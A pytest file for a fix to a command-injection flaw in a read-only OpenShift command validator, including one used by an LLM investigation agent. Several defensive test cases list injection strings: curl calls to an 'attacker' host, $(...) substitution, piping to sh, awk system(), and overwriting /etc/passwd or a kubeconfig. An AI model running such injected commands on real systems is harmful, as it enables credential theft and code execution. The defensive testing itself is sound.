"""Read-only oc commands must not be a shell (finding P0.1).

`_is_safe_command` split on `|` and checked only the first segment's verb, and
execution used `subprocess.run(cmd, shell=True)` whenever the string contained
a pipe. So `oc get pods | grep x; curl …` was validated as "oc get, piped to
grep" and then handed to `/bin/sh`, which ran the `curl` too — with the
executor kubeconfig in the environment. The same string came from an LLM in
`engine/investigation_agent.py`, whose validator did not look past `oc get` at
all.

Pipes remain supported. What changed is that they are argv stages executed
without a shell, that metacharacters are refused rather than relied on the
parser to ignore, and that no filter capable of writing or calling
`system()` is reachable.
"""

import pathlib
import subprocess

import pytest


def _remediation():
    from api.routers.dashboard import remediation

    return remediation


class TestValidator:
    @pytest.mark.parametrize("command", [
        "oc get pods; curl http://attacker/x",
        "oc get pods && curl http://attacker/x",
        "oc get pods || curl http://attacker/x",
        "oc get pods $(curl http://attacker/x)",
        "oc get pods `curl http://attacker/x`",
        "oc get pods > /etc/stargate/kubeconfigs/kubeconfig-executor",
        "oc get pods\ncurl http://attacker/x",
        "oc get pods | grep x; curl http://attacker/x",
        "oc get pods &",
        "oc get pods \\; curl x",
    ])
    def test_shell_metacharacters_are_refused(self, command):
        assert _remediation()._is_safe_command(command) is False

    @pytest.mark.parametrize("command", [
        "oc get pods | sh",
        "oc get pods | bash -c id",
        "oc get pods | xargs rm",
        "oc get pods | tee /tmp/x",
        "oc get pods | awk '{system(\"id\")}'",
        "oc get pods | sed -i s/a/b/ /etc/passwd",
        "oc get pods | sort -o /etc/stargate/kubeconfigs/kubeconfig-executor",
        "oc get pods |",
        "| grep x",
        "oc get pods || grep x",
    ])
    def test_only_harmless_filters_are_reachable(self, command):
        assert _remediation()._is_safe_command(command) is False

    @pytest.mark.parametrize("command", [
        "oc get pods -n lab",
        "oc get pods -n lab -o wide | grep -v Running",
        "oc get events -n lab | grep -A5 Warning",
        "oc describe pod x -n lab | grep -A10 Events | head -20",
        "oc get pvc -n lab | wc -l",
        "oc adm node-logs node-1 --since=-1h | grep -i error",
    ])
    def test_the_catalog_s_pipelines_still_validate(self, command):
        assert _remediation()._is_safe_command(command) is True

    def test_flags_are_checked_beyond_the_first_stage(self):
        assert _remediation()._is_safe_command("oc get pods -n lab -f x.yaml") is False
        assert _remediation()._is_safe_command("oc get pods -n lab | grep -f patterns") is False

    def test_write_verbs_and_adm_subcommands_stay_closed(self):
        assert _remediation()._is_safe_command("oc delete pod x -n lab") is False
        assert _remediation()._is_safe_command("oc adm policy add-role-to-user admin u") is False
        assert _remediation()._is_safe_command("oc exec pod/x -- cat /etc/passwd") is False

    def test_an_unresolved_placeholder_is_not_a_command(self):
        # `oc get crd | grep <resource>` is in the remediation catalog with a
        # placeholder nobody substitutes. It used to run and return an ERROR
        # line; refusing it is the same outcome with less pretending.
        assert _remediation()._is_safe_command("oc get crd | grep <resource>") is False


class TestRunner:
    def _capture(self, monkeypatch, results):
        calls = []

        def fake_run(argv, **kwargs):
            calls.append((argv, kwargs))
            stdout, returncode = results[len(calls) - 1]
            return subprocess.CompletedProcess(argv, returncode, stdout, "" if returncode == 0 else "boom")

        monkeypatch.setattr(subprocess, "run", fake_run)
        return calls

    def test_a_pipeline_is_argv_stages_chained_by_stdin(self, monkeypatch):
        from engine.oc_runner import run_pipeline, split_pipeline

        calls = self._capture(monkeypatch, [("pod-a\npod-b\n", 0), ("pod-b\n", 0)])

        stdout, _stderr, returncode = run_pipeline(
            split_pipeline("oc get pods -n lab | grep -v pod-a"), kubeconfig="/tmp/kc"
        )

        assert returncode == 0
        assert stdout == "pod-b\n"
        assert [argv for argv, _ in calls] == [
            ["oc", "get", "pods", "-n", "lab"],
            ["grep", "-v", "pod-a"],
        ]
        # No shell, ever — not even for a pipe.
        assert all(kwargs.get("shell") in (None, False) for _, kwargs in calls)
        assert "shell" not in calls[0][1]
        # The first stage gets /dev/null; the second gets the first's stdout.
        assert calls[0][1]["stdin"] is subprocess.DEVNULL
        assert calls[1][1]["input"] == "pod-a\npod-b\n"
        assert calls[0][1]["env"]["KUBECONFIG"] == "/tmp/kc"

    def test_a_failing_stage_stops_the_pipeline(self, monkeypatch):
        from engine.oc_runner import run_pipeline, split_pipeline

        calls = self._capture(monkeypatch, [("", 1)])

        stdout, stderr, returncode = run_pipeline(
            split_pipeline("oc get pods | grep x"), timeout=8
        )

        assert (stdout, stderr, returncode) == ("", "boom", 1)
        assert len(calls) == 1
        assert calls[0][1]["timeout"] == 8

    def test_split_pipeline_rejects_empty_stages(self):
        from engine.oc_runner import split_pipeline

        assert split_pipeline("oc get pods") == [["oc", "get", "pods"]]
        assert split_pipeline("oc get pods |") == []
        assert split_pipeline("| grep x") == []
        assert split_pipeline("") == []


class TestDiagnosticsEndpoint:
    def test_injection_is_refused_before_execution(self, client):
        response = client.post(
            "/admin/diagnostics/run",
            json={
                "command": "oc get pods -n lab | grep x; id",
                "namespace": "lab",
                "cluster": "ocpv07",
            },
        )

        assert response.status_code == 403
        assert "read-only" in response.json()["detail"]

    def test_a_valid_command_gets_past_validation(self, client):
        """503 is the harness answering "no kubeconfig here", not a refusal.

        The distinction is the point: the previous validator let the string
        through and the shell decided what ran.
        """
        response = client.post(
            "/admin/diagnostics/run",
            json={"command": "oc get pods -n lab", "namespace": "lab", "cluster": "ocpv07"},
        )

        assert response.status_code != 403

CATALOG = pathlib.Path(__file__).resolve().parent.parent / "remediations" / "catalog.yaml"

# Catalog entries the read-only runner will not execute. Eight are write verbs
# the old validator already refused. The other three are the ones this change
# costs: two end in shell operators (`|| echo`, `|| true`) and one carries an
# `<resource>` placeholder nobody fills in. They only ever ran — or appeared to
# — because a `|` in the string selected `shell=True`.
REFUSED_CATALOG_COMMANDS = {
    "oc create secret docker-registry {name} --docker-server=REGISTRY --docker-username=USER --docker-password=TOKEN",
    "oc delete namespace {namespace} --wait=true --timeout=120s",
    "oc delete pod {pod} -n {namespace} --force --grace-period=0",
    "oc new-project {namespace}",
    "oc patch resourcepool {pool} -n {namespace} --type=merge -p '{\"spec\":{\"minAvailable\":5}}'",
    "oc rollout restart deployment/showroom -n {namespace}",
    "oc rollout restart deployment/{deployment} -n {namespace}",
    "oc secrets link default {name} --for=pull",
    "oc get alerts -A 2>/dev/null || echo 'Not available'",
    "oc get crd | grep <resource>",
    "oc get installplan -A --no-headers | grep -c Pending || true",
}


def _catalog_oc_commands():
    import yaml

    found = []

    def walk(node):
        if isinstance(node, dict):
            for key, value in node.items():
                if key == "commands" and isinstance(value, list):
                    found.extend(c for c in value if isinstance(c, str))
                else:
                    walk(value)
        elif isinstance(node, list):
            for item in node:
                walk(item)

    walk(yaml.safe_load(CATALOG.read_text()))
    return sorted({c for c in found if c.strip().startswith("oc ")})


class TestCatalog:
    def test_the_refused_set_does_not_grow_silently(self):
        """The catalog is data feeding a security-gated runner.

        If someone adds a command the validator will not execute, that should
        be a visible decision here, not a diagnostic line that quietly stopped
        appearing in investigation reports.
        """
        refused = {c for c in _catalog_oc_commands() if not _remediation()._is_safe_command(c)}

        assert refused - REFUSED_CATALOG_COMMANDS == set(), (
            "these catalog commands are now refused and are not on the "
            f"known list: {sorted(refused - REFUSED_CATALOG_COMMANDS)}"
        )
        stale = REFUSED_CATALOG_COMMANDS - refused
        assert stale == set(), f"these are no longer refused: {sorted(stale)}"

    def test_most_of_the_catalog_still_runs(self):
        commands = _catalog_oc_commands()
        allowed = [c for c in commands if _remediation()._is_safe_command(c)]

        assert len(allowed) == len(commands) - len(REFUSED_CATALOG_COMMANDS)


class TestInvestigationAgent:
    @pytest.mark.parametrize("command", [
        "oc get pods; id",
        "oc get pods $(id)",
        "oc get pods | sh",
        "oc get pods | awk '{system(\"id\")}'",
        "oc delete pod x",
        "oc exec pod/x -- id",
    ])
    def test_the_agent_tool_refuses_exactly_what_the_console_refuses(self, command):
        from engine.investigation_agent import _is_safe_oc

        assert _is_safe_oc(command) is False

    def test_the_agent_tool_refuses_without_running_anything(self, monkeypatch, tmp_path):
        from engine import investigation_agent

        def explode(*args, **kwargs):  # pragma: no cover - must not be called
            raise AssertionError("refused commands must not execute")

        monkeypatch.setattr(subprocess, "run", explode)
        (tmp_path / "kubeconfig-ocpv07").write_text("apiVersion: v1\n")

        result = investigation_agent.tool_oc_read(
            "oc get pods; id", "ocpv07", str(tmp_path)
        )

        assert result.startswith("REFUSED:")
